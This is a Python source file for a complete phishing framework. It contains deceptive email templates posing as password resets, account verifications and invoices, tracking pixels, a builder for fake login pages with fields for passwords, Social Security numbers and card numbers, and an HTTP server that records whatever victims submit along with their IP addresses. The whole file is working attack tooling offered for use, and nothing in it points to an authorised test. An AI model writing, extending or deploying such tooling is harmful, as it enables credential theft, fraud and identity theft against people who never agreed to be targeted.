#!/usr/bin/env python3
"""
SE1 — Phishing Framework
Email template generation, credential capture server, landing page builder, tracking pixels
"""

import http.server
import socketserver
import smtplib
import email.mime.text
import email.mime.multipart
import email.mime.image
import json
import os
import uuid
import base64
from datetime import datetime
from typing import Dict, List, Optional
import threading
import urllib.parse


class EmailTemplate:
    """Generate phishing email templates"""
    
    def __init__(self):
        self.templates = {
            "password_reset": {
                "subject": "Password Reset Request",
                "body": """Dear {name},

We received a request to reset your password for {company} account.

Click the link below to reset your password:
{url}

If you didn't request this, please ignore this email.

Best regards,
{company} Security Team"""
            },
            "account_verify": {
                "subject": "Account Verification Required",
                "body": """Dear {name},

Your {company} account requires verification.

Please verify your account by clicking:
{url}

This link expires in 24 hours.

Thank you,
{company} Support"""
            },
            "invoice": {
                "subject": "Invoice #{invoice_id} - Payment Required",
                "body": """Dear {name},

Please find attached invoice #{invoice_id} for your review.

Total Amount: ${amount}
Due Date: {due_date}

View and pay online: {url}

Best regards,
{company} Finance"""
            }
        }
    
    def generate(self, template_type: str, name: str, company: str, 
                 url: str, **kwargs) -> Dict[str, str]:
        """Generate email from template"""
        if template_type not in self.templates:
            raise ValueError(f"Unknown template: {template_type}")
        
        template = self.templates[template_type]
        body = template["body"].format(
            name=name,
            company=company,
            url=url,
            **kwargs
        )
        
        return {
            "subject": template["subject"],
            "body": body
        }
    
    def list_templates(self) -> List[str]:
        """List available templates"""
        return list(self.templates.keys())


class TrackingPixel:
    """Generate and manage tracking pixels"""
    
    def __init__(self, server_url: str):
        self.server_url = server_url.rstrip("/")
        self.tracking_data = {}
        self.pixel_id = str(uuid.uuid4())[:8]
    
    def generate_pixel(self, recipient_id: str) -> bytes:
        """Generate a 1x1 transparent GIF tracking pixel"""
        pixel_url = f"{self.server_url}/track/{self.pixel_id}/{recipient_id}"
        
        # Minimal 1x1 transparent GIF
        gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
        gif += b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00'
        gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        gif += b'\x01\x00\x3b'
        
        self.tracking_data[recipient_id] = {
            "url": pixel_url,
            "sent": datetime.now().isoformat(),
            "opened": None
        }
        
        return gif
    
    def get_pixel_url(self, recipient_id: str) -> str:
        """Get tracking pixel URL for HTML embedding"""
        return f"{self.server_url}/track/{self.pixel_id}/{recipient_id}"
    
    def record_open(self, recipient_id: str):
        """Record when pixel is opened"""
        if recipient_id in self.tracking_data:
            self.tracking_data[recipient_id]["opened"] = datetime.now().isoformat()
    
    def get_stats(self) -> Dict:
        """Get tracking statistics"""
        total = len(self.tracking_data)
        opened = sum(1 for d in self.tracking_data.values() if d["opened"])
        return {
            "total_sent": total,
            "total_opened": opened,
            "open_rate": f"{(opened/total*100):.1f}%" if total > 0 else "0%",
            "details": self.tracking_data
        }


class CredentialCapture:
    """Handle credential capture from forms"""
    
    def __init__(self):
        self.captured = []
        self.form_fields = ["username", "password", "email"]
    
    def store_credentials(self, data: Dict):
        """Store captured credentials"""
        entry = {
            "id": str(uuid.uuid4())[:8],
            "timestamp": datetime.now().isoformat(),
            "data": data,
            "ip_address": data.get("ip_address", "unknown")
        }
        self.captured.append(entry)
        return entry["id"]
    
    def get_captured(self) -> List[Dict]:
        """Get all captured credentials"""
        return self.captured
    
    def export_json(self, filepath: str):
        """Export captured data to JSON"""
        with open(filepath, "w") as f:
            json.dump(self.captured, f, indent=2)
    
    def get_stats(self) -> Dict:
        """Get capture statistics"""
        return {
            "total_captured": len(self.captured),
            "entries": self.captured
        }


class LandingPageBuilder:
    """Build phishing landing pages"""
    
    def __init__(self):
        self.base_template = """<!DOCTYPE html>
<html>
<head>
    <title>{title}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .container {{ max-width: 400px; margin: 0 auto; }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        .form-group {{ margin-bottom: 15px; }}
        .form-group label {{ display: block; margin-bottom: 5px; }}
        .form-group input {{ width: 100%; padding: 10px; border: 1px solid #ccc; }}
        .submit-btn {{ width: 100%; padding: 12px; background: #007bff; color: white; border: none; cursor: pointer; }}
        .submit-btn:hover {{ background: #0056b3; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>{company}</h1>
        </div>
        <form action="{action}" method="POST">
            {fields}
            <button type="submit" class="submit-btn">{button_text}</button>
        </form>
        {tracking_pixel}
    </div>
</body>
</html>"""
    
    def build_form(self, fields: List[str]) -> str:
        """Build HTML form fields"""
        html_fields = []
        field_labels = {
            "username": "Username or Email",
            "password": "Password",
            "email": "Email Address",
            "phone": "Phone Number",
            "ssn": "Social Security Number",
            "card": "Credit Card Number"
        }
        
        for field in fields:
            label = field_labels.get(field, field.title())
            field_type = "password" if "pass" in field else "text"
            html_fields.append(f'''
            <div class="form-group">
                <label>{label}</label>
                <input type="{field_type}" name="{field}" required>
            </div>''')
        
        return "\n".join(html_fields)
    
    def build_page(self, company: str, title: str, fields: List[str],
                   action: str, button_text: str = "Submit",
                   tracking_url: Optional[str] = None) -> str:
        """Build complete landing page"""
        form_fields = self.build_form(fields)
        
        tracking_pixel = ""
        if tracking_url:
            tracking_pixel = f'<img src="{tracking_url}" width="1" height="1" style="display:none;">'
        
        return self.base_template.format(
            company=company,
            title=title,
            action=action,
            fields=form_fields,
            button_text=button_text,
            tracking_pixel=tracking_pixel
        )
    
    def save_page(self, html: str, filepath: str):
        """Save landing page to file"""
        with open(filepath, "w") as f:
            f.write(html)


class PhishingServer(http.server.BaseHTTPRequestHandler):
    """HTTP server for credential capture and tracking"""
    
    credential_store = None
    tracking_pixel = None
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path.startswith("/track/"):
            # Tracking pixel
            parts = self.path.split("/")
            if len(parts) >= 4:
                recipient_id = parts[3]
                if PhishingServer.tracking_pixel:
                    PhishingServer.tracking_pixel.record_open(recipient_id)
            
            # Return 1x1 GIF
            gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
            gif += b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00'
            gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
            gif += b'\x01\x00\x3b'
            
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            self.wfile.write(gif)
        
        elif self.path.startswith("/page/"):
            # Serve landing page
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            page_file = self.path[6:]
            if os.path.exists(page_file):
                with open(page_file, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"Page not found")
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests (credential capture)"""
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        
        # Parse form data
        form_data = urllib.parse.parse_qs(post_data)
        credentials = {k: v[0] if isinstance(v, list) else v for k, v in form_data.items()}
        credentials["ip_address"] = self.client_address[0]
        
        # Store credentials
        if PhishingServer.credential_store:
            entry_id = PhishingServer.credential_store.store_credentials(credentials)
            print(f"[CAPTURED] ID: {entry_id} from {self.client_address[0]}")
        
        # Redirect or show thank you page
        self.send_response(302)
        self.send_header("Location", "/thank-you")
        self.end_headers()
    
    def log_message(self, format, *args):
        """Custom log format"""
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")


class PhishingCampaign:
    """Main campaign orchestrator"""
    
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.template_gen = EmailTemplate()
        self.pixel = TrackingPixel(server_url)
        self.capturer = CredentialCapture()
        self.landing_builder = LandingPageBuilder()
        self.campaign_id = str(uuid.uuid4())[:8]
    
    def create_campaign(self, name: str, template_type: str, target_company: str,
                        target_list: List[Dict], form_fields: List[str]) -> Dict:
        """Create a new phishing campaign"""
        campaign = {
            "id": self.campaign_id,
            "name": name,
            "template_type": template_type,
            "target_company": target_company,
            "target_count": len(target_list),
            "form_fields": form_fields,
            "created": datetime.now().isoformat()
        }
        
        # Build landing page
        page = self.landing_builder.build_page(
            company=target_company,
            title=f"{target_company} Login",
            fields=form_fields,
            action=f"{self.server_url}/capture",
            tracking_url=f"{self.server_url}/track/{self.pixel.pixel_id}/campaign"
        )
        
        # Save landing page
        page_path = f"landing_{self.campaign_id}.html"
        self.landing_builder.save_page(page, page_path)
        campaign["landing_page"] = page_path
        
        # Generate emails for each target
        emails = []
        for target in target_list:
            tracking_url = self.pixel.get_pixel_url(target.get("id", str(uuid.uuid4())[:8]))
            tgt = dict(target)
            tgt.setdefault("name", "User")
            email_content = self.template_gen.generate(
                template_type=template_type,
                company=target_company,
                url=f"{self.server_url}/page/{page_path}",
                **tgt
            )
            emails.append({
                "to": target.get("email"),
                "subject": email_content["subject"],
                "body": email_content["body"],
                "tracking_pixel": tracking_url
            })
        
        campaign["emails"] = emails
        return campaign
    
    def start_server(self, port: int = 8080):
        """Start the credential capture server"""
        PhishingServer.credential_store = self.capturer
        PhishingServer.tracking_pixel = self.pixel
        
        with socketserver.TCPServer(("", port), PhishingServer) as httpd:
            print(f"[*] Phishing server running on port {port}")
            print(f"[*] Tracking pixel: {self.server_url}/track/")
            httpd.serve_forever()
    
    def get_stats(self) -> Dict:
        """Get campaign statistics"""
        return {
            "campaign_id": self.campaign_id,
            "tracking_stats": self.pixel.get_stats(),
            "capture_stats": self.capturer.get_stats()
        }


if __name__ == "__main__":
    print("SE1 — Phishing Framework")
    print("=" * 40)
    
    # Example usage
    framework = PhishingCampaign("http://localhost:8080")
    
    # List available templates
    print("\nAvailable email templates:")
    for template in framework.template_gen.list_templates():
        print(f"  - {template}")
    
    # Create sample campaign
    targets = [
        {"name": "John Doe", "email": "john@example.com", "id": "001"},
        {"name": "Jane Smith", "email": "jane@example.com", "id": "002"}
    ]
    
    campaign = framework.create_campaign(
        name="Test Campaign",
        template_type="password_reset",
        target_company="Example Corp",
        target_list=targets,
        form_fields=["username", "password"]
    )
    
    print(f"\nCampaign created: {campaign['id']}")
    print(f"Landing page: {campaign['landing_page']}")
    print(f"Emails prepared: {len(campaign['emails'])}")
    
    print("\nTo start the server:")
    print("  python3 phishing_framework.py --server")
